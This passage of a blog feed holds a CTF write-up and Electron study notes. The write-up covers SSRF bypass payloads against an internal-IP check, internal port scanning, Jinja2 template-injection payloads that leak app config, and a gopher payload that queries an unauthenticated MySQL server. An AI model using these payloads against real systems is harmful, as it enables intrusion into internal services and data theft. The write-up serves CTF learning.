punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token punctuation">.</span><span class="token string">' is inner ip'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>ÊÑèÊÄùÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá<code>http|https|gopher|dict</code>ÂõõÁßçÂçèËÆÆËøõË°åCurlÊìç‰ΩúÔºåÂπ∂‰∏îÊé¢ÊµãÂà∞ÁöÑÂÜÖÂÆπ‰ºöÈÄöËøá<code>var_dump($output);</code>ÊâìÂç∞Âá∫Êù•Ôºå‰ΩÜÊòØÂÆÉ‰ºöÂØπÊàë‰ª¨Êé¢ÊµãÁöÑipÂú∞ÂùÄËøõË°åcheckÔºåÁúãÊòØÂê¶‰∏∫ÂÜÖÁΩëÂú∞ÂùÄÔºà<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">ÂèØ‰ª•ËøõË°åbypassÔºåËøôÈ¢òÁöÑssrf‰∏é‰∏äÊµ∑Â§ßÂ≠¶ÁîüÁΩëÂÆâËµõÊüêÊò•ÁßãÂá∫ÁöÑÈ¢òÊúâ‰∫õËÆ∏Á±ª‰ºº</a>Ôºâ„ÄÇ</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>ÂéüÁêÜÔºö<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã"><a href="#0x02-Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã" class="headerlink" title="0x02 Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã"></a>0x02 Áü•ÈÅìÁΩëÊÆµÂêéËÇÜÊó†ÂøåÊÉÆÁöÑÂÜÖÁΩëÊé¢Êµã</h2><p><code>PS: ÊÉ≥ÂÜô‰∏Ä‰∏™Ëá™Âä®ÂåñÁöÑSSRFÊé¢ÊµãÂ∑•ÂÖ∑</code></p><p>ÈÄöËøábpÁöÑintruderÊ®°ÂùóÔºåÂØπÂÜÖÁΩëÁΩëÊÆµÁöÑÂ∏∏Áî®Á´ØÂè£ËøõË°åÊúçÂä°Êé¢ÊµãÔºà172.11.243.0/24ÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>ÂèØ‰ª•ÂæóÂà∞<code>172.11.243.81:8080</code>Âíå<code>172.11.243.218:3306</code>ÔºåÂàÜÂà´‰∏∫‰∏Ä‰∏™flaskÊúçÂä°ÂíåmysqlÊúçÂä°„ÄÇ</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>Ê†πÊçÆÊ∫êÁ†Å‰∏≠Âá∫Áé∞ÁöÑ<code>flask.render_template_string</code>ÔºåÂèØ‰ª•Áü•ÈÅìËøôÊòØËÄÉSSTIÊ®°ÊùøÊ≥®ÂÖ•Ôºå‰ΩÜÊòØËøôÈáåÂØπ<code>(„ÄÅ)„ÄÅconfig„ÄÅself</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÊó†Ê≥ïËøõË°åÂ∏∏ËßÑÁöÑÊìç‰ΩúÔºåÊ≥®ÊÑèÂà∞<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>ÔºåÂèØ‰ª•ÊÉ≥ÂäûÊ≥ïgetÂà∞HINTÁöÑÂÄºÔºåÂèØ‰ª•ÂèÇËÄÉ<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">‰ªéSSTIÂà∞Ê≤ôÁÆ±ÈÄÉÈÄ∏-jinja2</a>„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>ÊãøpayloadÊâì‰∏ÄÂèëÂêéÊãøÂà∞‰∫ÜHINTÈáåÈù¢ÁöÑmysqlÁî®Êà∑Âêç„ÄÇ</p><h2 id="0x03-ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏"><a href="#0x03-ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏" class="headerlink" title="0x03 ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏"></a>0x03 ÊãøÂà∞Êï∞ÊçÆÂ∫ìÂêçÂêéÂØπmysqlÁöÑÁãÇËΩ∞Êª•ÁÇ∏</h2><p>Ê≥®ÊÑèÂà∞ÊúÄÂºÄÂßãÂÖÅËÆ∏Êàë‰ª¨‰ΩøÁî®ÁöÑÂçèËÆÆ‰∏≠ÂåÖÊã¨<code>gopher</code>ÂçèËÆÆÔºåÈÄöËøá<code>ssrfÔºãgopher</code>Êàë‰ª¨ÂèØ‰ª•ÂØπÊú™ËÆæÁΩÆÂØÜÁ†ÅÁöÑmysqlÊúçÂä°ËøõË°åÊîªÂáªÔºåËøôÈáåÁî®Âà∞Github‰∏äÈù¢‰∏Ä‰∏™Â•Ω‰∏úË•ø<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>„ÄÇ</p><p>ÂàóÊï∞ÊçÆÂ∫ìÂêçÔºà‰æùÊ¨°Á±ªÊé®ÔºåÊãøË°®ÂêçÔºåÊãøÂàóÂêçÔºågetflagÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÊàë‰ª¨ÊòØÂú®ÊâìssrfÔºåÈÄöËøáË∑≥ÊùøÊâìÂÜÖÁΩëÔºåpayload‰∏≠ÁöÑurlÁºñÁ†ÅÈúÄË¶ÅËøõË°å‰∫åÊ¨°ÁºñÁ†ÅÊâçËÉΩÊ≠£Â∏∏ÂèëÊå•‰ΩúÁî®Ôºö</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flagÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-Â∞èÁªì"><a href="#0x04-Â∞èÁªì" class="headerlink" title="0x04 Â∞èÁªì"></a>0x04 Â∞èÁªì</h2><p>ÁéØÂ¢ÉÂíåÊ∞õÂõ¥ÔºåÈ¢òÁõÆÁöÑË¥®ÈáèÔºåÈÉΩËÉΩÂÜ≥ÂÆö‰Ω†Ëá™Â∑±ÁöÑËøõÊ≠•ÈÄüÂ∫¶„ÄÇÂΩìÁÑ∂ÔºåÊúÄÈáçË¶ÅÁöÑËøòÊòØ‰Ω†Ëá™Â∑±ÁöÑÂùöÊåÅÂíåÂä™Âäõ„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> ‰ø°ÊÅØÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSRF </tag>
            
            <tag> ÂÜÖÁΩë </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Electron-Learning-1</title>
      <link href="/2019/01/25/Electron-Learning-1/"/>
      <url>/2019/01/25/Electron-Learning-1/</url>
      
        <content type="html"><![CDATA[<p>Electron.</p><a id="more"></a>    <h1 id="Electron-Â≠¶‰π†ËÆ∞ÂΩï"><a href="#Electron-Â≠¶‰π†ËÆ∞ÂΩï" class="headerlink" title="Electron Â≠¶‰π†ËÆ∞ÂΩï"></a>Electron Â≠¶‰π†ËÆ∞ÂΩï</h1><blockquote><p>ÂèÇËÄÉ ÈìæÊé•Ôºö</p><p><a href="https://www.jianshu.com/p/1687f8dcd70c" target="_blank" rel="noopener">ÂºÄÂèë Electron app ÂøÖÁü•ÁöÑ 4 ‰∏™ tips</a></p><p><a href="https://www.w3cschool.cn/electronmanual/" target="_blank" rel="noopener">Electronn‰∏≠ÊñáÊâãÂÜå</a></p><p><a href="https://mlln.cn/2018/01/08/electron%E4%BD%9C%E4%B8%BApython%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Electron‰∏épython</a></p><p><a href="https://www.jianshu.com/p/59a0a24ed388" target="_blank" rel="noopener">3ÂàÜÈíü‰∏äÊâãÔºöÈÄöËøávueÂíåelectronÂàõÂª∫Ê°åÈù¢Â∫îÁî®</a> </p></blockquote><h2 id="Electron-ÁÆÄ‰ªã"><a href="#Electron-ÁÆÄ‰ªã" class="headerlink" title="Electron ÁÆÄ‰ªã"></a>Electron ÁÆÄ‰ªã</h2><p>ÂºïÁî®W3schoolÁöÑElectron‰∏≠ÊñáÊñáÊ°£ÁÆÄ‰ªãÔºö</p><blockquote><p>Electron ÂèØ‰ª•ËÆ©‰Ω†‰ΩøÁî®Á∫Ø <a href="https://www.w3cschool.cn/javascript/" target="_blank" rel="noopener">JavaScript</a> Ë∞ÉÁî®‰∏∞ÂØåÁöÑÂéüÁîü APIs Êù•ÂàõÈÄ†Ê°åÈù¢Â∫îÁî®„ÄÇ‰Ω†ÂèØ‰ª•ÊääÂÆÉÁúã‰ΩúÊòØ‰∏ìÊ≥®‰∫éÊ°åÈù¢Â∫îÁî®ËÄå‰∏çÊòØ web ÊúçÂä°Âô®ÁöÑÔºåio.js ÁöÑ‰∏Ä‰∏™Âèò‰Ωì„ÄÇ</p><p>Ëøô‰∏çÊÑèÂë≥ÁùÄ Electron ÊòØÁªëÂÆö‰∫Ü GUI Â∫ìÁöÑ JavaScript„ÄÇÁõ∏ÂèçÔºåElectron ‰ΩøÁî® web È°µÈù¢‰Ωú‰∏∫ÂÆÉÁöÑ GUIÔºåÊâÄ‰ª•‰Ω†ËÉΩÊääÂÆÉÁúã‰ΩúÊàê‰∏Ä‰∏™Ë¢´ JavaScript ÊéßÂà∂ÁöÑÔºåÁ≤æÁÆÄÁâàÁöÑ Chromium ÊµèËßàÂô®„ÄÇ</p></blockquote><h3 id="‰∏ªËøõÁ®ãÔºàMain-ProcessÔºâ"><a href="#‰∏ªËøõÁ®ãÔºàMain-ProcessÔºâ" class="headerlink" title="‰∏ªËøõÁ®ãÔºàMain ProcessÔºâ"></a>‰∏ªËøõÁ®ãÔºàMain ProcessÔºâ</h3><p>Âú® Electron ÈáåÔºåËøêË°å <code>package.json</code> Èáå <code>main</code> ËÑöÊú¨ÁöÑËøõÁ®ãË¢´Áß∞‰∏∫<strong>‰∏ªËøõÁ®ã</strong>„ÄÇÂú®‰∏ªËøõÁ®ãËøêË°åÁöÑËÑöÊú¨ÂèØ‰ª•‰ª•ÂàõÂª∫ web È°µÈù¢ÁöÑÂΩ¢ÂºèÂ±ïÁ§∫ GUI„ÄÇ</p><h3 id="Ê∏≤ÊüìËøõÁ®ãÔºàRenderer-ProcessÔºâ"><a href="#Ê∏≤ÊüìËøõÁ®ãÔºàRenderer-ProcessÔºâ" class="headerlink" title="Ê∏≤ÊüìËøõÁ®ãÔºàRenderer ProcessÔºâ"></a>Ê∏≤ÊüìËøõÁ®ãÔºàRenderer ProcessÔºâ</h3><p>Áî±‰∫é Electron ‰ΩøÁî® Chromium Êù•Â±ïÁ§∫È°µÈù¢ÔºåÊâÄ‰ª• Chromium ÁöÑÂ§öËøõÁ®ãÁªìÊûÑ‰πüË¢´ÂÖÖÂàÜÂà©Áî®„ÄÇÊØè‰∏™ Electron ÁöÑÈ°µÈù¢ÈÉΩÂú®ËøêË°åÁùÄËá™Â∑±ÁöÑËøõÁ®ãÔºåËøôÊ†∑ÁöÑËøõÁ®ãÊàë‰ª¨Áß∞‰πã‰∏∫<strong>Ê∏≤ÊüìËøõÁ®ã</strong>„ÄÇ</p><p>Âú®‰∏ÄËà¨ÊµèËßàÂô®‰∏≠ÔºåÁΩëÈ°µÈÄöÂ∏∏‰ºöÂú®Ê≤ôÁõíÁéØÂ¢É‰∏ãËøêË°åÔºåÂπ∂‰∏î‰∏çÂÖÅËÆ∏ËÆøÈóÆÂéüÁîüËµÑÊ∫ê„ÄÇÁÑ∂ËÄåÔºå<code>Electron Áî®Êà∑Êã•ÊúâÂú®ÁΩëÈ°µ‰∏≠Ë∞ÉÁî® io.js ÁöÑ APIs ÁöÑËÉΩÂäõ</code>ÔºåÂèØ‰ª•‰∏éÂ∫ïÂ±ÇÊìç‰ΩúÁ≥ªÁªüÁõ¥Êé•‰∫§‰∫í„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190124203528.png" alt="ËøêË°åÊ¶ÇËø∞"></p><h2 id="Electron-Âú®Á∫ø-Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã"><a href="#Electron-Âú®Á∫ø-Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã" class="headerlink" title="Electron Âú®Á∫ø/Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã"></a>Electron Âú®Á∫ø/Á¶ªÁ∫ø‰∫ã‰ª∂Êé¢Êµã</h2><blockquote><p>TipsÔºöelectron v4.02‰∏≠ÁöÑ‰∏ªËøõÁ®ãÂíåÊ∏≤ÊüìËøõÁ®ãËøõË°åÈÄö‰ø°ÁöÑÊó∂ÂÄôÔºåÂ∞±ÈúÄË¶ÅÁî®Âà∞<code>ipc</code>Ëøô‰∏™ÁâπÊÄß„ÄÇËÄå<code>ipc</code>ÂèàÂàÜ‰∏∫<code>ipcMain</code>Âíå<code>ipcRenderer</code>‰∏§‰∏™ÔºåÂàÜÂà´Áî®‰∫é‰∏ªËøõÁ®ãÂíåÊ∏≤ÊüìËøõÁ®ã„ÄÇ</p><p>letÂëΩ‰ª§ÂíåvarÂëΩ‰ª§‰∏çÂêåÁöÑÂú∞ÊñπÊòØletÁöÑÂØπË±°Âè™Âú®letÊâÄÂú®ÁöÑ‰ª£Á†ÅÂùóËåÉÂõ¥‰∏≠Ëµ∑‰ΩúÁî®„ÄÇ</p></blockquote><p>ËøôÈáåÈúÄË¶ÅÁî®Âà∞navigatorÂØπË±°Ôºå‰ΩÜÊòØÂú®electron‰∏ªËøõÁ®ã‰∏≠Ê≤°ÊúâËøô‰∏™ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂª∫Á´ã‰∏Ä‰∏™Ê∏≤ÊüìËøõÁ®ãÔºåÂà©Áî®IPCÈÄö‰ø°ÔºåËé∑ÂèñÁΩëÁªúÁä∂ÊÄÅ„ÄÇ</p><p>Âú®ÊàëÁöÑÁéØÂ¢É‰∏≠ÂèØ‰ª•ÈÄöËøá‰ª•‰∏ã‰ª£Á†ÅÂÆûË∑µÊàêÂäüÔºö</p><p><code>main.js</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>ipcMain<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token keyword">let</span> onlineStatusWindowapp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  onlineStatusWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> show<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  onlineStatusWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/online-status.html`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><code>online-status.html</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">const</span> <span class="token punctuation">{</span>ipcRenderer<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> updateOnlineStatus <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>onLine <span class="token operator">?</span> <span class="token string">'online'</span> <span class="token punctuation">:</span> <span class="token string">'offline'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*navigator.onLine ==> true or false*/</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  <span class="token function">updateOnlineStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Electron-ËøõÁ®ã"><a href="#Electron-ËøõÁ®ã" class="headerlink" title="Electron ËøõÁ®ã"></a>Electron ËøõÁ®ã</h2><p>ElectronÁöÑ<code>process</code>ÂØπË±°</p><pre class=" language-javascript"><code class="language-javascript">process<span class="token punctuation">.</span>type <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñËøõÁ®ãÁ±ªÂûãprocess<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'electron'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñelectronÁâàÊú¨process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'chrome'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> Ëé∑ÂèñchromiumÁöÑÁâàÊú¨process<span class="token punctuation">.</span>resourcePath <span class="token operator">-</span> String <span class="token operator">-</span> JavascriptÊ∫ê‰ª£Á†ÅË∑ØÂæÑ<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span>noAsar <span class="token operator">=</span> <span class="token boolean">true</span> or <span class="token boolean">false</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span><span class="token function">hang</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//‰ΩøÂæóËøõÁ®ãÁöÑ‰∏ªÁ∫øÁ®ãÊåÇËµ∑</span></code></pre><h2 id="Electron-ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥"><a href="#Electron-ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥" class="headerlink" title="Electron ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥"></a>Electron ÊîØÊåÅÁöÑChromeÂëΩ‰ª§Ë°åÂºÄÂÖ≥</h2><p>Âú®appÊ®°ÂùóÁöÑready‰∫ã‰ª∂ÂèëÂá∫‰πãÂâçÂèØ‰ª•ÈÄöËøá<code>app.commandLine.appendSwitch</code>Êù•Ê∑ªÂä†ÊåáÂÆöÁöÑÂëΩ‰ª§ÂèÇÊï∞Âà∞mainËÑöÊú¨‰∏≠Ôºö</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>app<span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'remote-debugging-port'</span><span class="token punctuation">,</span> <span class="token string">'8315'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'host-rules'</span><span class="token punctuation">,</span> <span class="token string">'MAP * 127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Your code here</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token 